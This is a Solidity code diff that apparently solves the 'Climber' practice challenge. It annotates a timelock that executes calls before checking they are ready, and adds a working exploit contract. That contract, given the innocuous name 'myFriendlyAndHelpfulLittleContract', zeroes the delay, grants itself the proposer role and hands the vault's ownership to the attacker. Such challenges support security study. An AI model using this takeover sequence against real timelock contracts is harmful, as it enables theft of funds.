@@ -24,9 +24,9 @@ contract ClimberTimelock is AccessControl {
 
     // Operation data tracked in this contract
     struct Operation {
-        uint64 readyAtTimestamp;   // timestamp at which the operation will be ready for execution
-        bool known;         // whether the operation is registered in the timelock
-        bool executed;      // whether the operation has been executed
+        uint64 readyAtTimestamp; // timestamp at which the operation will be ready for execution
+        bool known; // whether the operation is registered in the timelock
+        bool executed; // whether the operation has been executed
     }
 
     // Operations are tracked by their bytes32 identifier
@@ -34,10 +34,7 @@ contract ClimberTimelock is AccessControl {
 
     uint64 public delay = 1 hours;
 
-    constructor(
-        address admin,
-        address proposer
-    ) {
+    constructor(address admin, address proposer) {
         _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
         _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);
 
@@ -48,14 +45,18 @@ contract ClimberTimelock is AccessControl {
         _setupRole(PROPOSER_ROLE, proposer);
     }
 
-    function getOperationState(bytes32 id) public view returns (OperationState) {
+    function getOperationState(bytes32 id)
+        public
+        view
+        returns (OperationState)
+    {
         Operation memory op = operations[id];
-        
-        if(op.executed) {
+
+        if (op.executed) {
             return OperationState.Executed;
-        } else if(op.readyAtTimestamp >= block.timestamp) {
+        } else if (op.readyAtTimestamp >= block.timestamp) {
             return OperationState.ReadyForExecution;
-        } else if(op.readyAtTimestamp > 0) {
+        } else if (op.readyAtTimestamp > 0) {
             return OperationState.Scheduled;
         } else {
             return OperationState.Unknown;
@@ -82,8 +83,11 @@ contract ClimberTimelock is AccessControl {
         require(targets.length == dataElements.length);
 
         bytes32 id = getOperationId(targets, values, dataElements, salt);
-        require(getOperationState(id) == OperationState.Unknown, "Operation already known");
-        
+        require(
+            getOperationState(id) == OperationState.Unknown,
+            "Operation already known"
+        );
+
         operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
         operations[id].known = true;
     }
@@ -101,10 +105,12 @@ contract ClimberTimelock is AccessControl {
 
         bytes32 id = getOperationId(targets, values, dataElements, salt);
 
+        // optimistically executes operations
         for (uint8 i = 0; i < targets.length; i++) {
             targets[i].functionCallWithValue(dataElements[i], values[i]);
         }
-        
+
+        // checks if operation is executable after
         require(getOperationState(id) == OperationState.ReadyForExecution);
         operations[id].executed = true;
     }
@@ -116,4 +122,52 @@ contract ClimberTimelock is AccessControl {
     }
 
     receive() external payable {}
+}
+
+contract myFriendlyAndHelpfulLittleContract {
+    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
+
+    function doStuff(
+        address _attacker,
+        address _vault,
+        address payable _thisTimelock
+    ) public {
+        // define all the values going into the schedule call, should be a way to do it prettier/faster than this but just gonna do what works for now
+
+        address[] memory targets = new address[](4);
+        targets[0] = _thisTimelock;
+        targets[1] = _thisTimelock;
+        targets[2] = _vault;
+        targets[3] = address(this);
+
+        uint256[] memory values = new uint256[](4);
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+        bytes[] memory dataElements = new bytes[](4);
+        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        dataElements[1] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            keccak256("PROPOSER_ROLE"),
+            address(this)
+        );
+        dataElements[2] = abi.encodeWithSignature(
+            "transferOwnership(address)",
+            _attacker
+        );
+        dataElements[3] = abi.encodeWithSignature(
+            "doStuff(address,address,address)",
+            _attacker,
+            _vault,
+            _thisTimelock
+        );
+
+        ClimberTimelock(_thisTimelock).schedule(
+            targets,
+            values,
+            dataElements,
+            keccak256(abi.encodePacked("0x"))
+        );
+    }
 }
